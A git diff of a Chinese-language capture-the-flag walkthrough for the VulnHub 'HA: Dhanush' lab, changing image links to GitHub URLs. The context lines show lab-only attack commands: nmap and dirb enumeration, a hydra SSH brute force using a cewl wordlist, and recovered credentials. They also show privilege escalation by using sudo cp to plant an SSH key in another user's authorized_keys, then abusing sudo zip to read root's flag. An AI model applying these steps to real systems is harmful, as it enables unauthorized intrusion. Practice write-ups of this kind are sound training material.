@@ -16,7 +16,7 @@
 nmap -A -p- 192.168.253.141
 ```
 
-![](../img/HA Dhanush-01.png)
+![](https://github.com/CHN-Han/Promote/tree/master/VulnHub/img/HA Dhanush-01.png)
 
 > **对网页进行浏览,然而并没有发现任何信息,我们进行枚举**
 
@@ -24,7 +24,7 @@ nmap -A -p- 192.168.253.141
 dirb http://192.168.253.141/
 ```
 
-![](./img/HA Dhanush-02.png)
+![](https://github.com/CHN-Han/Promote/tree/master/VulnHub/img/HA Dhanush-02.png)
 
 > **然而并没有发现什么有用的信息,因此怀疑是不是跟SSH有关**
 
@@ -33,7 +33,7 @@ cewl http://192.168.253.141/ -w 1.txt		# 爬取网站生成字典
 hydra -L 1.txt -P 1.txt  -vV -e ns 192.168.253.141 ssh -s 65345
 ```
 
-![](./img/HA Dhanush-03.png)
+![](https://github.com/CHN-Han/Promote/tree/master/VulnHub/img/HA Dhanush-03.png)
 
 ```
 # username:pinak,password:Gandiv
@@ -41,7 +41,7 @@ ssh pinak@192.168.253.141 -p 65345
 sudo -l
 ```
 
-![](./img/HA Dhanush-04.png)
+![](https://github.com/CHN-Han/Promote/tree/master/VulnHub/img/HA Dhanush-04.png)
 
 > **我们需要想办法切换到sarang用户,因此可以使用cp命令将SSH密钥复制到他的.ssh目录中**
 
@@ -51,7 +51,7 @@ cd .ssh/
 chmod 777 id_rsa.pub
 ```
 
-![](./img/HA Dhanush-05.png)
+![](https://github.com/CHN-Han/Promote/tree/master/VulnHub/img/HA Dhanush-05.png)
 
 ```
 cp id_rsa.pub ../
@@ -60,11 +60,11 @@ sudo -u sarang /bin/cp ./id_rsa.pub /home/sarang/.ssh/authorized_keys
 ssh sarang@127.0.0.1 -p 65345
 ```
 
-![](./img/HA Dhanush-06.png)
+![](https://github.com/CHN-Han/Promote/tree/master/VulnHub/img/HA Dhanush-06.png)
 
 >**切换到sarang用户,发现root权限的zip命令**
 
-![](./img/HA Dhanush-07.png)
+![](https://github.com/CHN-Han/Promote/tree/master/VulnHub/img/HA Dhanush-07.png)
 
 ```
 touch get
@@ -73,4 +73,4 @@ cd /root
 cat flag.txt
 ```
 
-![](./img/HA Dhanush-08.png)
+![](https://github.com/CHN-Han/Promote/tree/master/VulnHub/img/HA Dhanush-08.png)
